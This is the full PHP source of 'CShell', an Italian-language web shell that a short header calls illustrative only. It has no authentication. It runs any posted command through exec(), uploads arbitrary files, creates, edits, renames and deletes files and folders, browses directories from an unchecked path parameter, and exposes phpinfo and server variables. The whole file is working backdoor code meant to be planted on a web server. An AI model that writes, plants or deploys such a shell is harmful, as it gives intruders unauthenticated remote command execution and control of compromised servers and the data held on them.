<?php

/*

 * CShell

 * Solo a scopo illustrativo

 * By Crashinside <http://crashinside.net/>

 * Sito ufficiale: <http://gabryhacker.altervista.org/#cshell>

 *

 */

error_reporting("E_ALL & ~E_NOTICE & ~E_WARNING");

function delete_dir($dir) {

	if(!is_dir($dir))

		return 1;

	$handle = @glob($dir."/*");

	for($i=0;$i<count($handle);$i++)	 

		(is_dir($handle[$i])) ? delete_dir($handle[$i]) : unlink($handle[$i]);

	rmdir($dir);

	return (is_dir($dir)) ? 1 : 0;

}

function Size($f) {

	return round(filesize($f) / 1024,3);

}

function dirsize($dir) {

	foreach(glob($dir."/*") as $f)

		$d += (is_file($f)) ? filesize($f) : dirsize($f);

	return round($d/1024,3);

}

function getPerms($f)  {

	//By blacklight, edit by me

	$mode = fileperms($f);

	$perm = '';

	$perm .= ($mode & 00400) ? 'r' : '-';

	$perm .= ($mode & 00200) ? 'w' : '-';

	$perm .= ($mode & 00100) ? 'x' : '-';

	$perm .= ($mode & 00040) ? 'r' : '-';

	$perm .= ($mode & 00020) ? 'w' : '-';

	$perm .= ($mode & 00010) ? 'x' : '-';

	$perm .= ($mode & 00004) ? 'r' : '-';

	$perm .= ($mode & 00002) ? 'w' : '-';

	$perm .= ($mode & 00001) ? 'x' : '-';

	return (is_dir($f)) ? "d".$perm : $perm;

}

function getDay($s) {

	switch($s) {

		case "Mon":

			return "Lun";

		break;

		case "Tue":

			return "Mar";

		break;

		case "Wed":

			return "Mer";

		break;

		case "Thu":

			return "Gio";

		break;

		case "Fry":

			return "Ven";

		break;

		case "Sat":

			return "Sab";

		break;

		case "Sun":

			return "Dom";

		break;

		default:

			return 0;

		break;

	}

}

function getLastModific($f) {

	$a = filemtime($f);

	return getDay(date("D")).date(" j/m/Y H:i", $a);

}

function Host($m) {

	$inf = array(

		"ua" => $_SERVER['HTTP_USER_AGENT'],

		"os" => "",

		"ip" => $_SERVER['REMOTE_ADDR'],

		"date" => date("D d F H:i:s")

	);

	$ds = array('Mon','Tue','Wed','Thu','Fri','Sat','Sun');

	$ids = array('Lun','Mar','Mer','Gio','Ven','Sab','Dom');

	$ms = array('January','February','March','April','May','June','July','August','September','October','November','December');

	$ims = array('Gennaio','Febbraio','Marzo','Aprile','Maggio','Giugno','Luglio','Agosto','Settembre','Ottobre','Novembre','Dicembre');

	$inf['date'] = str_replace($ds,$ids,$inf['date']);

	$inf['date'] = str_replace($ms,$ims,$inf['date']);

	$colors = array("white","red","green","darkgreen","blue","yellow","purple","pink","skyblue","darkyellow","orange","lightgreen","darkorange","aquablue","lilla","grey","brown");

	if(eregi("win",$inf['ua']))

		$inf['os'] = "Microsoft Windows";

	elseif(eregi("linux",$inf['ua']))

		$inf['os'] = "Linux";

	elseif (eregi("mac", $inf['ua']))

		$inf['os'] = "MacIntosh";

	else

		$inf['os'] = "Unknown";

	if(eregi("firefox",$inf['ua'])) {

		$p = split(" ",$inf['ua']);

		$a = split("/",$p[sizeof($p)-1]);

		$inf['ua'] = "Mozilla firefox v. ".$a[1];

	} elseif(eregi("MSIE",$inf['ua'])) {

		$p = split(" ",$inf['ua']);

		for($i=0;$i<strlen($p[3]);$i++)

			if($p[3]{$i} != ";")

				$a[] = $p[3]{$i};

		$inf['ua'] = "Internet Explorer v. ".join("",$a);

	} elseif(eregi("Opera",$inf['ua'])) {

		$p = split(" ",$inf['ua']);

		$p = split("/",$p[0]);

		$inf['ua'] = "Opera v. ".$p[1];

	} elseif(eregi("Chrome",$inf['ua'])) {

		$p = split(" ", $inf['ua']);

		$a = split("/", $p[sizeof($p)-2]);

		$a = explode(".",$a[1]);

		$inf['ua'] = "Google Chrome v. ".$a[0].".".$a[1];

	} elseif(eregi("Safari",$inf['ua'])) {

		$p = split(" ",$inf['ua']);

		$a = split("/",$p[sizeof($p)-2]);

		$a = explode(".",$a[1]);

		$inf['ua'] = "Safari v. ".$a[0].".".$a[1];;

	} else {

		$inf['ua'] = "Unknown";

	}

	switch($m) {

		case "ip":

			return $inf['ip'];

		break;

		case "brow":

			return $inf['ua'];

		break;

		case "os":

			return $inf['os'];

		break;

		case "date":

			return $inf['date'];

		break;

	}

}

if($_GET['mode'] == "phpinfo") {

	phpinfo();

	print "<a href=\"".$_SERVER['SCRIPT_NAME']."\">Torna</a><br>";

} elseif($_GET['mode'] == "server") {

	print "<table border=\"1\"><tr><td>Chiave</td><td>Valore</td></tr>";

	foreach($_SERVER as $k => $v)

		print "<tr><td>".$k."</td><td>".$v."</td></tr>";

	print "</table>";

	print "<a href=\"".$_SERVER['SCRIPT_NAME']."\">Torna</a><br>";

} else {

	$root = getcwd();

	$dir = (isset($_GET['dir'])) ? $_GET['dir'] : $root;

	$dire = ($dir == $root) ? "" : $dir."/";

	?>

	<html>

		<head>

			<title>CShell</title>

			<style type="text/css">

				p#title {

					font-size: 40;

					font-weight: bold;

					color: #666666;

					font-style: italic;

					text-align: center;

				}

				body {

					background-color: black;

					color: white;

				}

				span#dir {

					color: white;

					font-weight: bold;

				}

				a {

					color: red;

					text-decoration: none;

				}

				a:hover {

					color: white;

					text-decoration: underline;

				}

				.info1 {

					font-family: Courier;

					font-size: 15;

					color: white;

					float: left;

					margin-right: 20px;

				}

				.info2 {

					font-family: Courier;

					font-size: 15;

					color: white;

				}

				.text {

					background-color: transparent;

					color: white;

				}

				#col {

					float: left;

					margin-right: 20px;

				}

				#spam {

					font-size: 9px;

				}

			</style>

			<script type="text/javascript">

				function check(n) {

					switch(n) {

						case 0:

							if(document.forms[0].file.value != '')

								document.forms[0].submit();

							else

								alert("Inserisci un percorso ad un file");

						break;

						case 1:

							if(document.forms[1].cmd.value != '')

								document.forms[1].submit();

							else

								alert("Inserisci un comando");

						break;

						case 2:

							if(document.forms[2].nome.value != '')

								document.forms[2].submit();

							else

								alert("Inserisci un nome");

						break;

						case 3:

							if(document.forms[3].nome2.value != '')

								document.forms[3].submit();

							else

								alert("Non hai inserito il nome del file");

						break;

						case 4:

							if(document.forms[4].newname.value != '')

								document.forms[4].submit();

							else

								alert("Non hai inserito il nuovo nome del file");

						break;

					}

				}

			</script>

		</head>

		<body>

			<p id="title">CShell</p>

			<span class="info1">

				Host: <?php print $_SERVER['SERVER_NAME']; ?><br>

				Server: <?php print $_SERVER['SERVER_SOFTWARE']; ?><br>

				<?php print (is_callable("php_uname")) ? "Sistema operativo: ".php_uname()."<br>" : ""; ?>

				Phpinfo: <a target="_blank" href="?mode=phpinfo">Guarda phpinfo</a><br>

				Server: <a target="_blank" href="?mode=server">Guarda l'array $_SERVER</a><br>

			</span>

			<span class="info2">

				Informazioni client:<br>

				Indirizzo IP: <?php print Host("ip"); ?><br>

				Browser: <?php print Host("brow"); ?><br>

				Os: <?php print Host("os"); ?><br>

				Data: <?php print Host("date"); ?><br>

			</span><br>

			<div align="center" id="spam">Powered&nbsp;&nbsp;by&nbsp;&nbsp;<a target="_blank" href="http://gabryhacker.altervista.org/#cshell">Cshell</a>&nbsp;&nbsp;v.&nbsp;&nbsp;1.1.2</div>

			<hr><br>

			<div id="col">

				<form name="upload" action="" method="post" enctype="multipart/form-data">

					<table>

						<tr>

							<td>File: <input type="file" name="file"></td>

						</tr>

						<tr>

							<td><input type="button" value="Upload" onclick="check(0)"></td>

						</tr>

					</table>

				</form>

				<?php

				if(isset($_FILES['file'])) {

					$n = basename($_FILES['file']['name']);

					move_uploaded_file($_FILES['file']['tmp_name'], $dire.$n);

					print "<small>".((file_exists($dire.$n)) ? "File caricato" : "Errore nell'upload")."</small>";

				}

				?>

				<form name="exec" action="" method="post">

					<table>

						<tr>

							<td>Comando: <input class="text" type="text" name="cmd"></td>

						</tr>

						<tr>

							<td><input type="button" value="Esegui" onclick="check(1);"></td>

						</tr>

					</table>

				</form>

				<?php

				if(isset($_POST['cmd'])) {

					exec($_POST['cmd'],$out);

					print "<i>Risultato del comando:</i><br>";

					foreach($out as $l)

					print $l."<br>";

					print "<br><br>";

				}

				?>

				<form name="createfolder" action="" method="post">

					<table>

						<tr>

							<td>Crea una cartella: <input class="text" type="text" name="nome"></td>

						</tr>

						<tr>

							<td><input type="button" value="Esegui" onclick="check(2);"></td>

						</tr>

					</table>

				</form>

				<?php

				if(isset($_POST['nome'])) {

					mkdir($dire.$_POST['nome']);

					print "<small>".((is_dir($dire.$_POST['nome'])) ? "Cartella creata con successo" : "Errore nella creazione")."</small>";

				}

				?>

				<form name="createfile" action="" method="post">

					<table>

						<tr>

							<td>Crea un file: <input class="text" type="text" name="nome2"></td>

						</tr>

						<tr>

							<textarea class="text" name="txt" cols="30" rows="8"></textarea>

						</tr>

						<tr>

							<td><input type="button" value="Esegui" onclick="check(3);"></td>

						</tr>

					</table>

				</form>

				<?php

				if(isset($_POST['nome2'])) {

					$f = fopen($dire.$_POST['nome2'], "a");

					fputs($f, $_POST['txt']);

					fclose($f);

					print "<small>".((file_exists($dire.$_POST['nome2'])) ? "File creato con successo" : "Errore nella creazione del file")."</small>";

				}

				?>

			</div>

			<?php

			$exx = explode("/",$dir);

			array_pop($exx);

			?>

			Directory Corrente: <span id="dir"><?php print ($root != $dir) ? $root."/".(($dir == "./") ? "" : $dir) : $dir; ?></span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a title="Root" href="<?php print $_SERVER['SCRIPT_NAME']; ?>">Root</a><br>

			<?php

			if ($dir != $root && $dir != "./") {

				$a = explode("/",$dir);

				print "<a href=\"".((sizeof($a) != 1) ? "?dir=".$a[sizeof($a) - 2] : $_SERVER['SCRIPT_NAME'])."\">Indietro</a><br>";

			}

			?>

			<table border="0" cellpadding="2">

				<tr>

					<td>Nome</td>

					<td>Tipo file</td>

					<td>Permessi</td>

					<td>Dimensione</td>

					<td>Data Ultima Modifica</td>

					<td>Azioni</td>

				</tr>

				<?php

				$a = opendir($dir);

				while(false !== ($f = readdir($a))) {

					if($f != "." && $f != "..") {

						if(is_dir($dire.$f))

								$dirs[] = $f;

							else

								$files[] = $f;

					}

				}

				closedir($a);

				foreach($dirs as $d) {

					$d2 = (($dire == ".//") ? "" : $dire).$d;

					$d3 = ($dir != $root) ? "dir=".$dir."&" : "";

					print "<tr><td><a href=\"?dir=".$d2."\">".$d."</a></td><td>Directory</td>";

					print "<td>".getPerms($d2)."</td><td>".dirsize($d2)." kb</td><td>".getLastModific($d2)."</td>";

					print "<td><a href=\"?".$d3."mode=deletedir&d=".$d."\">D</a>&nbsp;";

					print "<a href=\"?".$d3."mode=rename&file=".$d."\">R</a></td></tr>";

				}

				foreach($files as $file) {

					$file2 = $dire.$file;

					$d3 = ($dir != $root) ? "dir=".$dir."&" : "";

					print "<tr><td><a target=\"_blank\" href=\"".$file2."\">".$file."</a></td>";

					$ex = pathinfo($file2);

					print "<td>File ".((empty($ex['extension'])) ? "sconosciuto" : $ex['extension'])."</td>";

					print "<td>".getPerms($file2)."</td><td>".Size($file2)." kb</td><td>".getLastModific($file2)."</td>";

					print "<td><a title='Edit' href=\"?".$d3."mode=edit&file=".$file."\">E</a>&nbsp;";

					print "<a title='Delete' href=\"?".$d3."mode=delete&file=".$file."\">D</a>&nbsp;";

					print "<a title='Rename' href=\"?".$d3."mode=rename&file=".$file."\">R</a>&nbsp;";

					//print "<a title='Move' href=\"?".$d3."mode=move&file=".$file."\">M</a></td></tr>";

				}

				?>

			</table>

			<?php

			if(isset($_GET['mode']) && $_GET['mode'] == "rename") {

			?>

			<form action="" name="rename" method="post">

				Nuovo nome: <input type="text" class="text" value="<?php print basename($_GET['file']); ?>" name="newname"><br>

				<input type="button" value="Rinomina" onclick="check(4);">

			</form>

			<?php

			if(isset($_POST['newname']))

				print "&nbsp;&nbsp;<small>".((rename($dir."/".$_GET['file'],$dir."/".$_POST['newname']) === true) ? "File/Cartella rinominato/a con successo" : "Errore nella rinominazione del/della file/cartella")."</small>";

			}

			if(isset($_GET['mode']) && $_GET['mode'] == "delete")

				print "&nbsp;&nbsp;<small>".((unlink($dir."/".$_GET['file']) === true) ? "File cancellato con successo" : "Errore nella cancellazione del file")."</small>";

			if(isset($_GET['mode']) && $_GET['mode'] == "deletedir") {

				delete_dir($dir."/".$_GET['d']);

				print "&nbsp;&nbsp;<small>".((!is_dir($_GET['d']) === true) ? "Cartella cancellata con successo" : "Errore nella cancellazione della cartella")."</small>";

			}

			if(isset($_GET['mode']) && $_GET['mode'] == "edit") {

			?>

			<form name="edit" action="" method="post">

				<input type="submit" value="Modifica"><br>

				<textarea name="editx" class="text" cols="45" rows="15"><?php print htmlentities(file_get_contents($dir."/".$_GET['file'])); ?></textarea>

			</form>

			<?php

				if(isset($_POST['editx'])) {

					$a = fopen($dir."/".$_GET['file'], "w");

					fputs($a, $_POST['editx']);

					fclose($a);

					print "&nbsp;&nbsp;<small>".(($a) ? "File modificato con successo" : "Errore nella modifica del file")."</small>";

				}

			}

			/*if(isset($_GET['mode']) && $_GET['mode'] == "move") {

				?>

				<form action="" method="post" name="move">

					Posizione del file: <input type="text" name="original" value="<?php print (($root != $dir) ? $root."/".(($dir == "./") ? "" : $dir) : $dir)."/".$_GET['file']; ?>" readonly><br>

					Nuova posizione: <input type="text" name="newplace" value="">&nbsp;&nbsp;

					<input type="submit" value="Sposta">

				</form>

				<?php

					if(isset($_POST['newplace'])) {

					

					}

			}*/

		}

		?>

	</body>

</html>